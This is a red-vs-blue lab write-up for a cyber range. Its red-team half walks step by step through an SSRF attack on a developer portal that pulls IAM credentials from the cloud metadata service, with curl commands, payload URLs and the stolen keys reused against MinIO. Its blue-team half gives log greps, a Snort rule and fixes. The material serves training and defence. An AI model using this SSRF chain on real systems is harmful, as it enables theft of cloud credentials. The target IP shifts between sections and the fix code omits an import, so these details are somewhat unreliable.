# GRIDFALL M1 Red vs Blue Writeup

## Red Team Writeup

# Solve Guide â€” Red Team
## RNG-CLD-01 | M1 â€” cld-webapp | SSRF â†’ Cloud Metadata Credential Theft
**Technique:** T1552.005 â€” Cloud Instance Metadata API  
**Difficulty:** â˜…â˜…â˜†â˜†â˜† | **Pivot In:** `cloud_api_key: pul-cloud-dev-aK8x2mP9!2024` (from Dev Zone M5 AWX output)

---

## Objective
Steal the cloud IAM role credentials from the Cloud Metadata Service (IMDS) at `169.254.169.254` by exploiting a Server-Side Request Forgery (SSRF) vulnerability in the URL Health Checker tool of the PUL Cloud Developer Portal.

---

## Step 1 â€” Discover the Portal

```bash
# Nmap service scan on M1
nmap -sV -sC -p- 193.0.3.155 -oN m1_scan.txt

# Key findings:
# 8080/tcp  open  http  PUL Cloud Developer Portal
```

Navigate to `http://193.0.3.155:8080` â€” you see a cloud portal login page.

<img width="1245" height="949" alt="image" src="https://github.com/user-attachments/assets/19944f5a-98ef-467d-9e87-ace426bcf1b3" />


---

## Step 2 â€” Authenticate to the Portal

You have the API key from Dev Zone M5 AWX job output: `pul-cloud-dev-aK8x2mP9!2024`

**Option A: Web login**
```
Username: cloud-dev
Password: CloudDev@PUL2024!
```

<img width="2042" height="1129" alt="image" src="https://github.com/user-attachments/assets/a0f7bf58-c437-41d1-a8ea-9793ef75e335" />



**Option B: API key authentication** (useful for scripting)
```bash
# The portal accepts X-Cloud-API-Key header on all authenticated routes
curl -s -H "X-Cloud-API-Key: pul-cloud-dev-aK8x2mP9!2024" \
    http://193.0.3.155:8080/dashboard
```
<img width="1883" height="1041" alt="image" src="https://github.com/user-attachments/assets/43a0c77d-91a4-4ba9-8e6c-c9d52b3dce53" />

---

## Step 3 â€” Identify the SSRF Vulnerability

Navigate to **Tools â†’ URL Health Checker**. The page description states:
> *"The URL Health Checker fetches a URL from this server and returns the raw response. Useful for testing webhooks and internal service connectivity."*

This fetches URLs **from the server** â€” the web application makes the outbound request, not your browser. This is the SSRF sink.

There is no server-side validation or allowlist on the URL input.

---

## Step 4 â€” Enumerate the IMDS

The Cloud Developer Portal runs on a cloud instance with an attached IAM role. The Instance Metadata Service (IMDS) is accessible at `169.254.169.254` â€” a link-local address only reachable from the instance itself, but reachable through SSRF.

**Step 4.1 â€” Verify IMDS is reachable:**
```
# In URL Health Checker, submit:
http://169.254.169.254/latest/meta-data/
```

Expected output:
```
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
instance-type
local-ipv4
placement/
```

<img width="2280" height="1176" alt="image" src="https://github.com/user-attachments/assets/96583ff9-12af-4d39-bac2-4124f6e5dec8" />


**Step 4.2 â€” Enumerate the IAM path:**
```
# Submit URL:
http://169.254.169.254/latest/meta-data/iam/
```
Output: `info` and `security-credentials/`

<img width="1713" height="836" alt="image" src="https://github.com/user-attachments/assets/7d089730-3990-4b95-bc43-8da453794b2b" />


**Step 4.3 â€” List the IAM role name:**
```
# Submit URL:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Output: `pul-cloud-role`

---

<img width="1969" height="639" alt="image" src="https://github.com/user-attachments/assets/7dad4515-5b45-4f08-b3d8-7beb708bc9b6" />


## Step 5 â€” Steal the IAM Credentials (THE GOAL)

```
# Submit URL:
http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role
```

Response:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAPUL2024CLDSVC01",
  "SecretAccessKey": "pULcLd/S3cr3t2024/K3y!",
  "Token": "AQoDYXdzEJr//////////wEaoAK0M2FakeSessionToken4GridfallOp==",
  "Expiration": "2025-12-31T23:59:59Z",
  "LastUpdated": "2024-11-15T06:00:00Z"
}
```
<img width="1828" height="624" alt="image" src="https://github.com/user-attachments/assets/5082f168-3815-4a2c-b0b8-551f1a3f99bb" />


**Or via API + curl (no browser needed):**
```bash
# Step 1: Login and capture cookie
curl -sc /tmp/cld-cookie.txt -X POST http://11.0.2.10:8080/login \
    -d "username=cloud-dev&password=CloudDev%40PUL2024%21" \
    -L -o /dev/null

# Step 2: SSRF via API
curl -sb /tmp/cld-cookie.txt -X POST http://11.0.2.10:8080/tools/url-check \
    -d "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fpul-cloud-role"
```

---

## Step 6 â€” Record Credentials and Pivot

```
AccessKeyId    : AKIAPUL2024CLDSVC01
SecretAccessKey: pULcLd/S3cr3t2024/K3y!
```

These credentials match the MinIO root credentials on **M2 (11.0.2.20:9000)**.

**Verify against M2:**
```bash
export AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01
export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'

aws s3 ls --endpoint-url http://11.0.2.20:9000
# Expected: pul-cloud-backups    pul-cloud-internal
```

---

## Summary

| Item | Value |
|---|---|
| Vulnerability | SSRF â€” unrestricted URL fetch from server |
| Target Service | Cloud Instance Metadata Service (IMDS) at 169.254.169.254 |
| Stolen Credential | AccessKeyId: AKIAPUL2024CLDSVC01 |
| Next Target | M2 MinIO (11.0.2.20:9000) |
| MITRE | T1552.005, T1190 |

---

## Blue Team Writeup

# Solve Guide â€” Blue Team
## RNG-CLD-01 | M1 â€” cld-webapp | SSRF Detection & Response
**MITRE Defend:** DE.CM-001 (Monitor network traffic), DE.AE-002 (Anomaly detection)

---

## Detection Approach

### 1. Application Log Analysis

The portal logs all URL Health Checker requests to `/var/log/pul-cloud/portal.log`. An SSRF attack against IMDS produces entries like:

```bash
sudo grep "URL_CHECK" /var/log/pul-cloud/portal.log
```

A successful IMDS SSRF chain looks like:
```
2024-11-15 11:04:22 [WARNING] URL_CHECK|src=33.55.55.136|url=http://169.254.169.254/latest/meta-data/|user=cloud-dev
2024-11-15 11:04:39 [WARNING] URL_CHECK|src=33.55.55.136|url=http://169.254.169.254/latest/meta-data/iam/|user=cloud-dev
2024-11-15 11:04:51 [WARNING] URL_CHECK|src=33.55.55.136|url=http://169.254.169.254/latest/meta-data/iam/security-credentials/|user=cloud-dev
2024-11-15 11:05:03 [WARNING] URL_CHECK|src=33.55.55.136|url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role|user=cloud-dev
```

The final entry above constitutes a credential theft event.

```bash
# Automated detection query â€” flag any URL_CHECK hitting 169.254.x.x:
grep "URL_CHECK" /var/log/pul-cloud/portal.log | grep "169\.254\."

# Also check for other internal targets:
grep "URL_CHECK" /var/log/pul-cloud/portal.log | \
    grep -E "(10\.|172\.16\.|192\.168\.|127\.|169\.254\.)"
```

### 2. IMDS Hit Detection

The IMDS simulator also logs every request:
```bash
sudo grep "IMDS_HIT" /var/log/pul-cloud/imds.log
```

An SSRF attempt shows the IMDS requests arriving from `127.0.0.1` (the Flask app requesting on behalf of the attacker), not from the attacker's IP directly:
```
2024-11-15 11:05:03 [WARNING] IMDS_HIT|src=127.0.0.1|path=/latest/meta-data/iam/security-credentials/pul-cloud-role
```

**Indicator:** IMDS requests from `127.0.0.1` should be very rare outside automated bootstrap. Any hit on `/iam/security-credentials/` from localhost is a high-confidence SSRF.

### 3. Network-Level Detection (if NIDS deployed)

Snort/Suricata rule to detect SSRF targeting IMDS:
```
alert http any any -> any any (msg:"SSRF IMDS credential theft attempt"; 
  content:"169.254.169.254"; http_client_body; 
  content:"/iam/security-credentials"; http_uri; 
  classtype:credential-access; sid:9000001; rev:1;)
```

---

## Forensic Investigation

### Determine Attacker Entry Point
```bash
# What credential authenticated before the SSRF?
grep "LOGIN_OK" /var/log/pul-cloud/portal.log | grep "$(date +%Y-%m-%d)"

# Cross-reference the source IP
grep "11:04" /var/log/pul-cloud/portal.log | grep -v favicon
```

### Establish Full Timeline
```bash
# All portal events from attacker IP (replace with actual IP)
ATTACKER_IP="33.55.55.136"
grep "${ATTACKER_IP}" /var/log/pul-cloud/portal.log | sort
```

### Confirm Credential Exfiltration
If the `URL_CHECK` log shows the response was printed to the attacker's browser, the `SecretAccessKey` was exfiltrated. Check M2 MinIO access logs immediately:
```bash
# On M2 â€” look for access from the attacker IP using AKIAPUL2024CLDSVC01
journalctl -u pul-minio --since "2024-11-15 11:00:00" | grep "AKIAPUL2024CLDSVC01"
```

---

## Containment

```bash
# 1. Immediately block attacker IP at firewall
ufw insert 1 deny from 33.55.55.136 comment "SSRF attacker â€” incident block"

# 2. Kill the URL Health Checker route temporarily
# Comment out the /tools/url-check route in /opt/pul-cloud-portal/app.py
# and restart the service
sudo systemctl restart pul-cloud-portal

# 3. Revoke the exposed API key
# Remove "pul-cloud-dev-aK8x2mP9!2024" from API_KEYS dict in app.py

# 4. Rotate MinIO credentials on M2 immediately â€” they're now compromised
# (AccessKeyId: AKIAPUL2024CLDSVC01 / SecretAccessKey: pULcLd/S3cr3t2024/K3y!)
```

---

## Remediation

**Fix 1 â€” Block SSRF at the application level (primary):**
```python
# In /opt/pul-cloud-portal/app.py, add before the requests.get() call:
import ipaddress, urllib.parse

SSRF_BLOCKED_RANGES = [
    ipaddress.ip_network("169.254.0.0/16"),   # Link-local (IMDS)
    ipaddress.ip_network("127.0.0.0/8"),       # Loopback
    ipaddress.ip_network("10.0.0.0/8"),        # RFC1918
    ipaddress.ip_network("172.16.0.0/12"),     # RFC1918
    ipaddress.ip_network("192.168.0.0/16"),    # RFC1918
]

def is_ssrf_blocked(url):
    try:
        host = urllib.parse.urlparse(url).hostname
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        return any(ip in net for net in SSRF_BLOCKED_RANGES)
    except Exception:
        return True  # Block on resolution failure

if is_ssrf_blocked(target_url):
    result = "[Error] This URL is blocked for security reasons."
```

**Fix 2 â€” IMDSv2 (token-required requests):**
If deploying on a real cloud, enable IMDSv2 which requires a PUT request with a session token header before GET requests are served. SSRF attacks using simple GET cannot fetch IMDSv2 tokens.

**Fix 3 â€” Principle of least privilege on IAM role:**
The `pul-cloud-role` IAM role should only grant access to S3 buckets this instance genuinely needs â€” not bucket-owner-level credentials that also work as MinIO root credentials.

**Fix 4 â€” Rotate all affected credentials:**
- MinIO root credentials (AccessKeyId: AKIAPUL2024CLDSVC01)
- Developer portal API key (pul-cloud-dev-aK8x2mP9!2024)
- Review all downstream access using the stolen key (M2, M3, M4, M5)

---

## Blue Team Checklist
- [ ] SSRF to 169.254.x.x detected in portal logs
- [ ] IMDS hit from 127.0.0.1 confirmed in IMDS logs
- [ ] Source IP and user account identified
- [ ] MinIO credentials rotated
- [ ] Portal API key revoked
- [ ] SSRF mitigation deployed to app code
- [ ] Downstream impact assessment on M2-M5 chain initiated

